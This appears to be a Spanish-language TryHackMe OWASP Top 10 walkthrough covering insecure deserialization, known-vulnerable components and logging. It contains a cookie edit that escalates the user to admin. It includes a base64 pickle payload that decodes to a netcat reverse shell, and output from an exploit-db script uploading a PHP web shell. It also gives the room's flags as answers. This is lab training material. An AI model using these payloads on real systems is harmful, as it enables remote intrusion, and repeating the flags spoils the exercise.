[![](https://user-content.gitlab-static.net/d2b1f44ac5ae6788506312aa3350b495b59b89d8/68747470733a2f2f692e696d6775722e636f6d2f65434e485a6d412e706e67)](https://user-content.gitlab-static.net/d2b1f44ac5ae6788506312aa3350b495b59b89d8/68747470733a2f2f692e696d6775722e636f6d2f65434e485a6d412e706e67)

Las cookies se pueden configurar en varios lenguajes de programación del sitio web. Por ejemplo, Javascript, PHP o Python, por nombrar algunos. La siguiente aplicación web está desarrollada usando Python's Flask, por lo que es apropiado usarla como ejemplo.

Tome el fragmento a continuación:

[![](https://user-content.gitlab-static.net/c893e0f64a3a714b4b105c2574a7795835f81a59/68747470733a2f2f692e696d6775722e636f6d2f39574f597762462e706e67)](https://user-content.gitlab-static.net/c893e0f64a3a714b4b105c2574a7795835f81a59/68747470733a2f2f692e696d6775722e636f6d2f39574f597762462e706e67)

Configurar cookies en Flask es bastante trivial. Simplemente, este fragmento obtiene la fecha y la hora actuales, las almacena dentro de la variable "marca de tiempo" y luego almacena la fecha y la hora en una cookie llamada "marca de tiempo de registro". Así es como se verá en el navegador.

[![](https://user-content.gitlab-static.net/c94087b553bf99c9de0b825868fc7ec7a959607f/68747470733a2f2f692e696d6775722e636f6d2f49346f5547736e2e706e67)](https://user-content.gitlab-static.net/c94087b553bf99c9de0b825868fc7ec7a959607f/68747470733a2f2f692e696d6775722e636f6d2f49346f5547736e2e706e67)

_Es tan simple como eso._

1. Si una cookie tuviera la ruta de webapp.com/login, ¿cuál sería la URL que el usuario debe visitar?

`webapp.com/login`

2. ¿Cuál es el acrónimo de la tecnología web sobre la que funcionan las cookies seguras?

`https`

## [](#day-8-insecure-deserialization-cookies-practical)[Día 8] Deserialización insegura - Práctica de cookies

.:. Accediendo a tu Instancia .:.

En el navegador del dispositivo con el que está conectado a la VPN, navegue hasta `http://MACHINE_IP`. Detallaré los pasos para Firefox: es posible que deba investigar cómo inspeccionar las cookies en el navegador de su elección. Será recibido con la página de inicio:

[![](https://user-content.gitlab-static.net/c391f6f68745573f7a88671baeba96ddf7f279e8/68747470733a2f2f692e696d6775722e636f6d2f4b3766495739642e706e67)](https://user-content.gitlab-static.net/c391f6f68745573f7a88671baeba96ddf7f279e8/68747470733a2f2f692e696d6775722e636f6d2f4b3766495739642e706e67)

_Vamos a crear una cuenta. No es necesario que ingrese sus detalles de TryHackMe, puede ingresar lo que quiera._

[![](https://user-content.gitlab-static.net/6e45919d30acde323c47872d4dd62fcbcf8d141f/68747470733a2f2f692e696d6775722e636f6d2f50386f36326c692e706e67)](https://user-content.gitlab-static.net/6e45919d30acde323c47872d4dd62fcbcf8d141f/68747470733a2f2f692e696d6775722e636f6d2f50386f36326c692e706e67)

_Donde será dirigido a su página de perfil. Aviso a la derecha, tienes tus datos._

[![](https://user-content.gitlab-static.net/b616789c9786d070429945633c767a844988901c/68747470733a2f2f692e696d6775722e636f6d2f366659643074642e706e67)](https://user-content.gitlab-static.net/b616789c9786d070429945633c767a844988901c/68747470733a2f2f692e696d6775722e636f6d2f366659643074642e706e67)

Haga clic derecho en la página y presione "Inspeccionar elemento". Vaya a la pestaña "Almacenamiento".

[![](https://user-content.gitlab-static.net/ffdb147f9663df75c1b5cb708471b624cb381547/68747470733a2f2f692e696d6775722e636f6d2f314c4d466656302e706e67)](https://user-content.gitlab-static.net/ffdb147f9663df75c1b5cb708471b624cb381547/68747470733a2f2f692e696d6775722e636f6d2f314c4d466656302e706e67)

**.:. Inspección de datos codificados .:.** Verá aquí que hay cookies codificadas en texto sin formato y codificadas en base64. La primera bandera se encontrará en una de estas cookies.

**.:. Modificación de los valores de las cookies .:.** Observe aquí que tiene una cookie llamada "userType". Actualmente es un usuario, como lo confirma su información en la página "mi perfil".

Esta aplicación determina lo que puede y no puede ver según su tipo de usuario. ¿Qué pasaría si quisieras convertirte en administrador?

Haga doble clic izquierdo en la columna "Valor" de "tipo de usuario" para modificar el contenido. Cambiemos nuestro tipo de usuario a "admin" y naveguemos `http://MACHINE_IP/admin`para responder a la segunda bandera.

1. Primera bandera (valor de la cookie)

`gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAYzBiYjAwMTkyMWFiNGU2NWFkNTBkNjM2ZTY2ZDFhZDhxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==`

- [Decodificar desde formato Base64](https://www.base64decode.org/)

`THM{good_old_base64_huh}`

2. Segunda bandera (panel de administración)

[![](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_22-01.png)](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_22-01.png)

`THM{heres_the_admin_flag}`

## [](#day-8-insecure-deserialization-remote-code-executi)[Día 8] Deserialización insegura - Ejecución remota de código...

_Un ataque mucho más nefasto que simplemente decodificar cookies, nos metemos en el meollo del asunto._

**.:. Configuración .:.**

1. Primero, cambie el valor de la cookie de tipo de usuario de "admin" a "usuario" y vuelva a `http://MACHINE_IP/myprofile`.
2. Luego, haga clic con el botón izquierdo en la URL en "Intercambiar su vim" que se encuentra en la captura de pantalla a continuación.

[![](https://user-content.gitlab-static.net/978efe7999da832d46281ddf6d82ac5d1dae8d36/68747470733a2f2f692e696d6775722e636f6d2f746447727663492e706e67)](https://user-content.gitlab-static.net/978efe7999da832d46281ddf6d82ac5d1dae8d36/68747470733a2f2f692e696d6775722e636f6d2f746447727663492e706e67)

3. Una vez que haya hecho esto, haga clic con el botón izquierdo en la URL en "¡Proporcione sus comentarios!" donde será directo a la página así:

[![](https://user-content.gitlab-static.net/8fabbe02c19dcd9a1d129566093579d207febc19/68747470733a2f2f692e696d6775722e636f6d2f467747305442732e706e67)](https://user-content.gitlab-static.net/8fabbe02c19dcd9a1d129566093579d207febc19/68747470733a2f2f692e696d6775722e636f6d2f467747305442732e706e67)

**.:. ¿Qué hace que esta forma sea vulnerable? .:.**

Si un usuario ingresara sus comentarios, los datos se codificarán y enviarán a la aplicación Flask (presumiblemente para almacenarlos en una base de datos, por ejemplo). Sin embargo, la aplicación asume que todos los datos codificados son confiables. Pero somos piratas informáticos. Solo puede confiar en nosotros en la medida en que pueda arrojarnos (y eso es casi imposible en línea)

_Aunque explicar la programación está un poco fuera del alcance de esta sala, es importante comprender lo que sucede en el siguiente fragmento:_

[![](https://user-content.gitlab-static.net/2e32e999724d98050606d430240c84165386d774/68747470733a2f2f692e696d6775722e636f6d2f6c676f6d414c392e706e67)](https://user-content.gitlab-static.net/2e32e999724d98050606d430240c84165386d774/68747470733a2f2f692e696d6775722e636f6d2f6c676f6d414c392e706e67)

Cuando visita la URL "Intercambie su vim", se codifica y almacena una cookie en su navegador, ¡perfecto para que lo modifiquemos! Una vez que visita el formulario de comentarios, el valor de esta cookie se decodifica y luego se deserializa. UH oh. En el fragmento a continuación, podemos ver cómo se recupera la cookie y luego se deserializa a través de`pickle.loads`

[![](https://user-content.gitlab-static.net/694bc22ef025aee88583766339cf8bcca952786a/68747470733a2f2f692e696d6775722e636f6d2f38696438314b332e706e67)](https://user-content.gitlab-static.net/694bc22ef025aee88583766339cf8bcca952786a/68747470733a2f2f692e696d6775722e636f6d2f38696438314b332e706e67)

Esta vulnerabilidad explota Python Pickle, que he adjuntado como material de lectura al final de la sala. Básicamente, tenemos rienda suelta para ejecutar lo que queramos, como un caparazón inverso.

.:. La Explotación .:.

Ahora no voy a dejarte colgando seco aquí. Primero, necesitamos configurar un oyente netcat en nuestro Kali. Si es suscriptor, puede controlar su propia [máquina TryHackMe Kali en el navegador](https://tryhackme.com/my-machine) .

[![](https://user-content.gitlab-static.net/916e2e9928b6fff85dc9379de56aa934322f5661/68747470733a2f2f692e696d6775722e636f6d2f467473666e71302e706e67)](https://user-content.gitlab-static.net/916e2e9928b6fff85dc9379de56aa934322f5661/68747470733a2f2f692e696d6775722e636f6d2f467473666e71302e706e67)

Debido a que el código que se deserializa tiene un formato base64, no podemos simplemente generar un shell inverso. Debemos codificar nuestros propios comandos en base64 para que se ejecute el código malicioso. Detallaré los pasos a continuación con el material proporcionado para hacerlo.

Una vez que esto esté completo, [copie y pegue el código fuente de esta página de Github](https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3) en su kali y modifique el código fuente para reemplazar su "YOUR_TRYHACKME_VPN_IP" con su IP de TryHackMe VPN. [Esto se puede obtener a través de la página de Acceso](https://tryhackme.com/access) .

1. Cree un archivo python para pegarlo, he usado "rce.py" para estos ejemplos:

[![](https://user-content.gitlab-static.net/be4090a5ff222456b41c736e7ce869504946208f/68747470733a2f2f692e696d6775722e636f6d2f6b393370617a4d2e706e67)](https://user-content.gitlab-static.net/be4090a5ff222456b41c736e7ce869504946208f/68747470733a2f2f692e696d6775722e636f6d2f6b393370617a4d2e706e67)

2. Pegue el código del sitio de GitHub, reemplazando YOUR_TRYHACKME_VPN_IP con su TryHackMe VPN IP de la página de acceso

[![](https://user-content.gitlab-static.net/d38e2e5a99147b71ced3dc6005d88bc83e565e42/68747470733a2f2f692e696d6775722e636f6d2f676652326c63662e706e67)](https://user-content.gitlab-static.net/d38e2e5a99147b71ced3dc6005d88bc83e565e42/68747470733a2f2f692e696d6775722e636f6d2f676652326c63662e706e67)

3. Ejecute "rce.py" a través de`python3 rce.py`
4. Tenga en cuenta la salida del comando, se verá algo similar a esto:

[![](https://user-content.gitlab-static.net/223b41263dd5fd0b3ffe01b0738b90c146379933/68747470733a2f2f692e696d6775722e636f6d2f36374f5562774e2e706e67)](https://user-content.gitlab-static.net/223b41263dd5fd0b3ffe01b0738b90c146379933/68747470733a2f2f692e696d6775722e636f6d2f36374f5562774e2e706e67)

5. Copie y pegue todo lo que esté entre las dos marcas de voz ('DATA'). En mi caso voy a copiar y pegar:

`gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTEuMy4yIDQ0NDQgPiAvdG1wL2aUhZRSlC4=`

El suyo puede verse ligeramente diferente, solo asegúrese de copiar todo lo que se encuentre entre las dos marcas de voz.`''`

6. Pegue esto en la cookie "encodedPayload" en su navegador:

[![](https://user-content.gitlab-static.net/76de79e78f101136b78365886afd1186c08f5408/68747470733a2f2f692e696d6775722e636f6d2f665a4461796a442e706e67)](https://user-content.gitlab-static.net/76de79e78f101136b78365886afd1186c08f5408/68747470733a2f2f692e696d6775722e636f6d2f665a4461796a442e706e67)

7. Asegúrese de que nuestro oyente netcat todavía se esté ejecutando:
8. Recarga la página. Se colgará, vuelva a consultar a su oyente de netcat:

[![](https://user-content.gitlab-static.net/9274bf6833014c3b47768b74081de5d91677c626/68747470733a2f2f692e696d6775722e636f6d2f574553546167542e706e67)](https://user-content.gitlab-static.net/9274bf6833014c3b47768b74081de5d91677c626/68747470733a2f2f692e696d6775722e636f6d2f574553546167542e706e67)

Si ha realizado los pasos correctamente, ahora tendrá un shell remoto para su instancia. No hay escalada de privilegios involucrada, ¡busque la bandera flag.txt!

1. bandera.txt

```
cat /home/cmnatic/flag.txt
```

`4a69a7ff9fd68`

## [](#day-9-components-with-known-vulnerabilities-explan)[Día 9] Componentes con vulnerabilidades conocidas: explicación...

Ocasionalmente, puede encontrar que la empresa/entidad en la que está realizando la prueba de penetración está utilizando un programa que ya tiene una vulnerabilidad bien documentada.

Por ejemplo, supongamos que una empresa no ha actualizado su versión de WordPress durante algunos años y, al usar una herramienta como wpscan, encuentra que es la versión 4.6. Una investigación rápida revelará que WordPress 4.6 es vulnerable a un exploit de ejecución remota de código no autenticado (RCE), y aún mejor, puede encontrar un exploit ya realizado en [exploit-db](https://www.exploit-db.com/exploits/41962) .

Como puede ver, esto sería bastante devastador, porque requiere muy poco trabajo por parte del atacante, ya que muchas veces, dado que la vulnerabilidad ya es bien conocida, alguien más ha hecho un exploit para la vulnerabilidad. La situación empeora aún más cuando te das cuenta de que es bastante fácil que esto suceda, si una empresa pierde una sola actualización de un programa que utiliza, podría ser vulnerable a una gran cantidad de ataques.

Por lo tanto, por qué OWASP ha calificado esto con un 3 (que significa alto) en la escala de prevalencia, es increíblemente fácil para una empresa perder una actualización de una aplicación.

1. Lea arriba.

`No answer needed`

## [](#day-9-components-with-known-vulnerabilities-exploi)[Día 9] Componentes con vulnerabilidades conocidas - Exploi...

Recuerde que dado que se trata de vulnerabilidades conocidas, la mayor parte del trabajo ya se ha hecho por nosotros. Nuestro trabajo principal es encontrar la información del software e investigarlo hasta que podamos encontrar un exploit. Repasemos eso con una aplicación web de ejemplo.

[![](https://user-content.gitlab-static.net/128439d20347b86454c2dad934ed81d6fd89706d/68747470733a2f2f692e696d6775722e636f6d2f625375687568702e706e67)](https://user-content.gitlab-static.net/128439d20347b86454c2dad934ed81d6fd89706d/68747470733a2f2f692e696d6775722e636f6d2f625375687568702e706e67)

Nostromo 1.9.6

Qué sabes, este servidor está usando la página predeterminada para el servidor web de nostromo. Ahora que tenemos un número de versión y un nombre de software, podemos usar [exploit-db](https://www.exploit-db.com/) para intentar encontrar un exploit para esta versión en particular.

(Nota: exploit-db es increíblemente útil, y para todos los principiantes lo usarán **mucho** , así que es mejor sentirse cómodo con él)

[![](https://user-content.gitlab-static.net/b7dcdc4914bbc299edd42e451dd20c27a8986bc9/68747470733a2f2f692e696d6775722e636f6d2f395764324534672e706e67)](https://user-content.gitlab-static.net/b7dcdc4914bbc299edd42e451dd20c27a8986bc9/68747470733a2f2f692e696d6775722e636f6d2f395764324534672e706e67)

Por suerte, el resultado principal resulta ser un script de explotación. Vamos a descargarlo e intentar obtener la ejecución del código. Ejecutar este script por sí solo nos enseña una lección muy importante.

[![](https://user-content.gitlab-static.net/6e22a4a29a92d0740b5011024f9419bdb95c454b/68747470733a2f2f692e696d6775722e636f6d2f5271597948426c2e706e67)](https://user-content.gitlab-static.net/6e22a4a29a92d0740b5011024f9419bdb95c454b/68747470733a2f2f692e696d6775722e636f6d2f5271597948426c2e706e67)

Puede que no funcione la primera vez. Es útil comprender el lenguaje de programación en el que se encuentra el script, de modo que, si es necesario, pueda corregir cualquier error o realizar modificaciones, ya que bastantes scripts en exploit-db esperan que realice modificaciones.

[![](https://user-content.gitlab-static.net/62473106916d4417dd7948bec8495bdaf4c42c40/68747470733a2f2f692e696d6775722e636f6d2f487437756336472e706e67)](https://user-content.gitlab-static.net/62473106916d4417dd7948bec8495bdaf4c42c40/68747470733a2f2f692e696d6775722e636f6d2f487437756336472e706e67)

Afortunadamente para nosotros, el error fue causado por una línea que debería haberse comentado, por lo que es una solución fácil.

[![](https://user-content.gitlab-static.net/664abc9e005981c3d7ee48f24539dd35be2433df/68747470733a2f2f692e696d6775722e636f6d2f78316c484a6f642e706e67)](https://user-content.gitlab-static.net/664abc9e005981c3d7ee48f24539dd35be2433df/68747470733a2f2f692e696d6775722e636f6d2f78316c484a6f642e706e67)

Arreglando eso, intentemos ejecutar el programa nuevamente.

¡Auge! Tenemos RCE. Ahora es importante tener en cuenta aquí que la mayoría de los scripts solo le dirán qué argumentos necesita proporcionar, los desarrolladores de exploits rara vez le harán leer potencialmente cientos de líneas de códigos solo para descubrir cómo usar el script.

También vale la pena señalar que puede que no siempre sea tan fácil, a veces solo se le dará un número de versión como en este caso, pero otras veces es posible que deba buscar en la fuente HTML, o incluso adivinar con suerte un exploit. script, pero siendo realistas, si se trata de una vulnerabilidad conocida, probablemente haya una manera de descubrir qué versión está ejecutando la aplicación.

Eso es realmente, lo mejor de esta pieza de OWASP 10 es que el trabajo ya está hecho para nosotros, solo necesitamos hacer una investigación básica, y como probador de penetración, ya lo estás haciendo bastante. poco :).

1. ¡Lea lo anterior!

`No answer needed`

## [](#day-9-components-with-known-vulnerabilities-practi)[Día 9] Componentes con vulnerabilidades conocidas: práctica...

La siguiente es una aplicación vulnerable, toda la información que necesita para explotarla se puede encontrar en línea.

Nota: cuando encuentre el script de explotación, ponga toda su entrada entre comillas, por ejemplo, "id"

1. Cuántos caracteres hay en /etc/passwd (use wc -c /etc/passwd para obtener la respuesta)

- [Online Book Store 1.0 - Ejecución de código remoto no autenticado](https://www.exploit-db.com/exploits/47887)

```
python3 47887.py http://10.10.243.197/

> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.243.197/bootstrap/img/2s5yhbfXdq.php
> Example command usage: http://10.10.243.197/bootstrap/img/2s5yhbfXdq.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y

RCE $ wc -c /etc/passwd
1611 /etc/passwd
```

`1611`

## [](#day-10-insufficient-logging-and-monitoring)[Día 10] Registro y supervisión insuficientes

Cuando se configuran las aplicaciones web, se debe registrar cada acción realizada por el usuario. El registro es importante porque, en caso de incidente, se pueden rastrear las acciones de los atacantes. Una vez que se rastrean sus acciones, se puede determinar su riesgo e impacto. Sin registro, no habría forma de saber qué acciones realizó un atacante si obtiene acceso a aplicaciones web particulares. Los mayores impactos de estos incluyen:

- daño regulatorio: si un atacante ha obtenido acceso a la información de identificación personal del usuario y no hay registro de esto, no solo se ven afectados los usuarios de la aplicación, sino que los propietarios de la aplicación pueden estar sujetos a multas o acciones más severas según las regulaciones.
- riesgo de nuevos ataques: sin registro, la presencia de un atacante puede pasar desapercibida. Esto podría permitir que un atacante lance más ataques contra los propietarios de aplicaciones web robando credenciales, atacando la infraestructura y más.

La información almacenada en los registros debe incluir:

- Códigos de estado HTTP
- Marcas de tiempo
- nombres de usuario
- Puntos finales de API/ubicaciones de página
- Direcciones IP

Estos registros contienen información confidencial, por lo que es importante garantizar que los registros se almacenen de forma segura y que se almacenen varias copias de estos registros en diferentes ubicaciones.

Como habrá notado, el registro es más importante después de que se haya producido una infracción o un incidente. El caso ideal es contar con monitoreo para detectar cualquier actividad sospechosa. El objetivo de detectar esta actividad sospechosa es detener al atacante por completo o reducir el impacto que ha tenido si su presencia se detecta mucho más tarde de lo previsto. Los ejemplos comunes de actividad sospechosa incluyen:

- múltiples intentos no autorizados para una acción en particular (generalmente intentos de autenticación o acceso a recursos no autorizados, por ejemplo, páginas de administración)
- solicitudes de direcciones IP o ubicaciones anómalas: si bien esto puede indicar que alguien más está intentando acceder a la cuenta de un usuario en particular, también puede tener una tasa de falsos positivos.
- uso de herramientas automatizadas: las herramientas automatizadas particulares pueden ser fácilmente identificables, por ejemplo, utilizando el valor de los encabezados de User-Agent o la velocidad de las solicitudes. Esto puede indicar que un atacante está utilizando herramientas automatizadas.
- cargas útiles comunes: en las aplicaciones web, es común que los atacantes utilicen cargas útiles de Cross Site Scripting (XSS). La detección del uso de estas cargas útiles puede indicar la presencia de alguien que realiza pruebas no autorizadas/maliciosas en las aplicaciones.

Solo detectar actividad sospechosa no es útil. Esta actividad sospechosa debe calificarse de acuerdo con el nivel de impacto. Por ejemplo, ciertas acciones tendrán un mayor impacto que otras. Estas acciones de mayor impacto deben ser respondidas antes, por lo que deben generar una alarma que llame la atención de la parte relevante.

Ponga este conocimiento en práctica analizando este archivo de registro de muestra.

```
200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
```

1. ¿Qué dirección IP está utilizando el atacante?

```
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
```

`49.99.13.16`

2. ¿Qué tipo de ataque se está llevando a cabo?

`Brute Force`